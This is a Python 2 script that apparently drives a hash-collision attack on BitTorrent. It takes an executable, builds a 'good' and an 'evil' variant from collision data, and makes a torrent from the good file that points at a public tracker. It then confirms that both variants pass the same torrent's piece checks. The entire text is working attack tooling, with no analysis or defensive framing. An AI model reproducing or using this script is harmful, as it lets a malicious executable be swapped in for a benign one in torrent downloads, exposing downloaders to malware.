import global_settings
import sys
import os
import ntpath
from hashlib import sha1, md5
from correct_alignment import rebaseCollisionData
from generateTorrent import generateTorrentFile, readFileData, writeFileData, verifyTorrentFile


if __name__ == '__main__':

	outputdirectory = 'output'
	torrentfilename = 'output.torrent'
	tracker = 'http://tracker.opentrackr.org:1337/announce'
	inputfile = 'CompiledFile\TwoFace.exe'
	chunksize = global_settings.chunksize
	
	print '[+] Reading original executable data'
	originalData = readFileData(inputfile)
	print '[+] Rebasing collision data'
	gooddata, evildata = rebaseCollisionData(originalData, chunksize)
	print '[+] Writing rebased file to output directory..'
	writeFileData(gooddata, os.path.join(outputdirectory, ntpath.basename(inputfile)))
	writeFileData(evildata, os.path.join(outputdirectory, 'evil_'+ntpath.basename(inputfile)))
	print '[+] Generating torrent file'
	torrent = generateTorrentFile(gooddata, ntpath.basename(inputfile), chunksize, tracker)
	writeFileData(torrent, os.path.join(outputdirectory, ntpath.basename(inputfile)+'.torrent'))
	print '[+] Checking if everything is okay'
	if sha1(gooddata).digest() == sha1(evildata).digest():
		print '[-] This is so unlikely even Google culd only do it once!'
		sys.exit()
	print '[+] Checking gooddata -> torrnet validity...'
	if verifyTorrentFile(gooddata, torrent):
		print '[+] OK!'
	else:
		print '[-] FAIL!'
	print '[+] Checking evildata -> torrnet validity'
	if verifyTorrentFile(evildata, torrent):
		print '[+] OK!'
	else:
		print '[-] FAIL!'	